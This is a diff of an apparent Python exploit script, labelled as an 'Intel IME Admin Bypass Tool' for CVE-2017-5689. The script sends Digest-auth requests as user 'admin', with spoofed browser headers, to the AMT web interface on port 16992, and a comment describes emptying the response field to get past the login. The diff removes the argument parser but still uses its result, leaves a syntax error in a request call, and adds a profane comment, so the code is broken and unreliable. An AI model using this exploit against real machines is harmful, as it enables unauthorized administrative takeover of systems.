@@ -58,40 +58,15 @@
 # WE MODIFY 'response=""' TO BE EMPTY WITH THE USERNAME "ADMIN" THAT IS ALL
 ################################################################################
 import os
-import argparse
 import requests
-import request.py
-################################################################################
-#OPTIONS!
-parser = argparse.ArgumentParser(description = 'Intel IME Admin Bypass Tool, \
-                                                CVE-2017-5689')
-parser.add_argument('--target',
-                                 dest     =  'target',
-                                 action   =  "store" ,
-                                 default  =  "192.168.0.44" ,
-                                 help     =  "Intel IME Server To Target \
-                                             (http://192.168.0.44)" )
-parser.add_argument('--port',
-                                 dest     =  'port',
-                                 action   =  "store" ,
-                                 default  =  '16992' ,
-                                 help     =  "Port for the IME Web UI \
-                                             (numbers only please)" )
-parser.add_argument('--browser',
-                                 dest     =  'which_browser',
-                                 action   =  "store" ,
-                                 default  =  'firefox' ,
-                                 help     =  "Browser to use (firefox,chrome)")
+import hacked_digest_auth
+import hacked_seleniumrequest
 
-arguments = parser.parse_args()
-################################################################################
-# Stuff for the hack
-################################################################################
 url                 =   "http://" + arguments.target + ":" + arguments.port
 ime_server_index    =   url + "/index.html"
 ime_server_logon    =   url + "/logon.html"
 #make it seem like we are being sent directly from the logon with every request
-useragent           =   'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 \
+sneaky_useragent    =   'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 \
                         Firefox/28.0'
 sneaky_headers      = { "Accept": "text/html,application/xhtml+xml,application/\
                         xml;q=0.9,image/webp,*/*;q=0.8",
@@ -121,11 +96,13 @@ if __name__ == "__main__":
 
         browser = Shiny_and_chrome()
 # begin authentication
+# read the damn replay ya idiot. CAPTURE A DAMN REPLAY YA IDIOT
     index = browser.request("GET",
-                            url, 
+                            url = ime_server_index, 
                             auth=HTTPDigestAuth('admin', 'Does_it_really_matter')
                             headers = sneaky_headers
                             )
 
 #the response SHOULD be the index_page
 ################################################################################   
+#BEGIN
